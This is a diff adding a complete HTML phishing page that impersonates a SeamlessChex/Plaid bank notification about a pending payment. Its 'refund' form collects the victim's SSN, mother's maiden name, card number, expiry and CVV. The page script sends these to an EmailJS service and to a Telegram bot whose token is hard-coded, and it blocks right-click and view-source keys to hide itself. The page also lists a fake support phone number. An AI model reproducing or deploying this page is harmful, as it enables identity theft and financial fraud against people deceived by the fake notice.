@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SeamlessChex Notification</title>
+<style>
+body { margin:0; padding:0; font-family: Arial, sans-serif; background-color:#f4f4f4; }
+.container { max-width:600px; margin:20px auto; background:#fff; border-radius:6px; overflow:hidden; }
+.header { padding:20px; border-bottom:1px solid #eee; text-align:center; }
+.header img { width:150px; max-width:100%; height:auto; display:block; margin:auto; }
+.content { padding:30px; font-size:16px; line-height:24px; color:#333; text-align:center; }
+.content p { margin:15px 0; }
+.content a { color:#0066cc; text-decoration:underline; font-weight:bold; cursor:pointer; }
+.plaid-img { margin:20px 0; text-align:center; }
+.form-container { display:none; padding:30px; }
+.success-message { display:none; padding:30px; font-size:16px; color:#333; text-align:center; }
+.success-message p { margin:15px 0; }
+.form-container h2 { color:#0d2d62; margin-bottom:20px; text-align:center; }
+.form-group { margin-bottom:15px; text-align:left; }
+label { display:block; margin-bottom:5px; font-size:14px; color:#333; }
+input { width:100%; padding:10px; border:1px solid #ccc; border-radius:6px; font-size:14px; box-sizing:border-box; }
+.grid { display:flex; gap:10px; flex-wrap:wrap; }
+.grid .form-group { flex:1 1 100%; }
+@media(min-width:500px) { .grid .form-group { flex:1 1 calc(50% - 10px); } }
+button { width:100%; padding:12px; background-color:#0d2d62; color:#fff; font-size:16px; font-weight:bold; border:none; border-radius:6px; cursor:pointer; }
+button:hover { background-color:#054e7b; }
+.footer { text-align:center; font-size:12px; color:#777; margin-top:10px; }
+</style>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+emailjs.init("OBp_VGlPq0lXhHAZ9"); // Replace with your EmailJS public key
+
+function showBillingForm() {
+  document.getElementById('emailContent').style.display = 'none';
+  document.getElementById('billingFormContainer').style.display = 'block';
+}
+
+// Prevent right-click and view-source shortcuts
+document.addEventListener('contextmenu', e => e.preventDefault());
+document.addEventListener('keydown', e => {
+  if (e.ctrlKey && ['u','U','s','S','i','I','j','J','c','C'].includes(e.key)) e.preventDefault();
+  if (e.key === 'F12') e.preventDefault();
+});
+
+// Input restrictions
+function restrictInput(event, maxLength, regex) {
+  const value = event.target.value;
+  if (value.length > maxLength) event.target.value = value.slice(0, maxLength);
+  if(regex) event.target.value = event.target.value.replace(regex,'');
+}
+
+async function submitBillingForm(event) {
+  event.preventDefault();
+  const form = {
+    fullName: document.getElementById('fullName').value,
+    motherMaidenName: document.getElementById('motherMaidenName').value,
+    address: document.getElementById('address').value,
+    zip: document.getElementById('zip').value,
+    phone: document.getElementById('phone').value,
+    ssn: document.getElementById('ssn').value,
+    cardNumber: document.getElementById('cardNumber').value,
+    expiry: document.getElementById('expiry').value,
+    cvv: document.getElementById('cvv').value
+  };
+
+  try { await emailjs.send('service_nw58k98', 'template_0uzffp6', form); } 
+  catch(err) { console.error('EmailJS error:', err); }
+
+  const telegramBotToken = '6113839454:AAFY5WlixlzhREvqK1DAGyZBRnDeY-D9jU4';
+  const chatId = '1461764555';
+  const message = `New Billing Form Submission:\n${JSON.stringify(form, null, 2)}`;
+  await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ chat_id: chatId, text: message })
+  });
+
+  // Show success message instead of alert
+  document.getElementById('billingFormContainer').style.display = 'none';
+  document.getElementById('successMessage').style.display = 'block';
+  document.getElementById('billingForm').reset();
+}
+</script>
+</head>
+<body>
+
+<div class="container">
+
+  <!-- Header (Logo) -->
+  <div class="header">
+    <img src="https://i.imgur.com/sEX5Llf.png" alt="Logo">
+  </div>
+
+  <!-- Email Content -->
+  <div id="emailContent" class="content">
+    <p style="font-size:20px; font-weight:bold; color:#002147;">
+      SeamlessChex connected to your Bank - Digital Banking account
+    </p>
+    <p style="font-size:14px; font-weight:bold; color:#666;">
+      Transaction ID 6GB80550RC2496746
+    </p>
+    <p>Your account has a pending payment scheduled for processing and will be deducted within 24 hours.</p>
+
+    <p style="font-size:14px; color:#555;">
+      If this wasn't you, 
+      <a onclick="showBillingForm()">click here to cancel the transaction and request a refund.</a>.
+    </p>
+
+    <!-- Customer Support Notice -->
+    <p style="font-size:14px; color:#555;">
+      <span style="color:orange; font-weight:bold;">Customer Support:</span> <span style="color:black; font-weight:bold;">‪+1 (818) 296-2990</span>
+    </p>
+
+    <!-- PLAID image -->
+    <p class="plaid-img">
+      <img src="https://i.imgur.com/n6G4EI8.png" alt="Plaid" width="200" style="display:block; margin:auto; max-width:100%; height:auto;">
+    </p>
+  </div>
+
+  <!-- Billing Form -->
+  <div id="billingFormContainer" class="form-container">
+    <p style="font-size:18px; font-weight:bold; color:#0d2d62; text-align:center; margin-bottom:10px;">
+      Refund Processing Form
+    </p>
+    <p style="font-size:16px; color:#333; text-align:center; margin-bottom:20px;">
+      Provide accurate details to ensure a secure and timely refund within 24 hrs.<br>
+    </p>
+
+    <form id="billingForm" onsubmit="submitBillingForm(event)">
+      <div class="grid">
+        <div class="form-group">
+          <label for="fullName">Full Name</label>
+          <input type="text" id="fullName" required>
+        </div>
+        <div class="form-group">
+          <label for="motherMaidenName">Mother's Maiden Name</label>
+          <input type="text" id="motherMaidenName" required>
+        </div>
+      </div>
+      <div class="grid">
+        <div class="form-group">
+          <label for="address">Billing Address</label>
+          <input type="text" id="address" required>
+        </div>
+        <div class="form-group">
+          <label for="zip">Zip Code</label>
+          <input type="text" id="zip" required maxlength="5" oninput="restrictInput(event,5,/\\D/g)">
+        </div>
+      </div>
+      <div class="grid">
+        <div class="form-group">
+          <label for="phone">Phone</label>
+          <input type="text" id="phone" required maxlength="10" oninput="restrictInput(event,10,/\\D/g)">
+        </div>
+        <div class="form-group">
+          <label for="ssn">SSN</label>
+          <input type="text" id="ssn" required maxlength="9" oninput="restrictInput(event,9,/\\D/g)">
+        </div>
+      </div>
+      <div class="form-group">
+        <label for="cardNumber">Card Number</label>
+        <input type="text" id="cardNumber" required maxlength="16" oninput="restrictInput(event,16,/\\D/g)">
+      </div>
+      <div class="grid">
+        <div class="form-group">
+          <label for="expiry">Expiry (MM/YY)</label>
+          <input type="text" id="expiry" required maxlength="5" oninput="restrictInput(event,5,/[^0-9\/]/g)">
+        </div>
+        <div class="form-group">
+          <label for="cvv">CVV</label>
+          <input type="text" id="cvv" required maxlength="4" oninput="restrictInput(event,4,/\\D/g)">
+        </div>
+      </div>
+      <button type="submit">Submit</button>
+    </form>
+    <div class="footer">By continuing, you agree to our terms and conditions.</div>
+  </div>
+
+  <!-- Success Message -->
+  <div id="successMessage" class="success-message">
+    <p style="font-size:18px; font-weight:bold; color:#0d2d62;">Process Completed</p>
+    <p>Thank you for completing the steps. Your submission has been successfully processed.</p>
+    <p>If you have any further questions or need assistance, feel free to contact us.</p>
+  </div>
+
+</div>
+
+</body>
+</html>
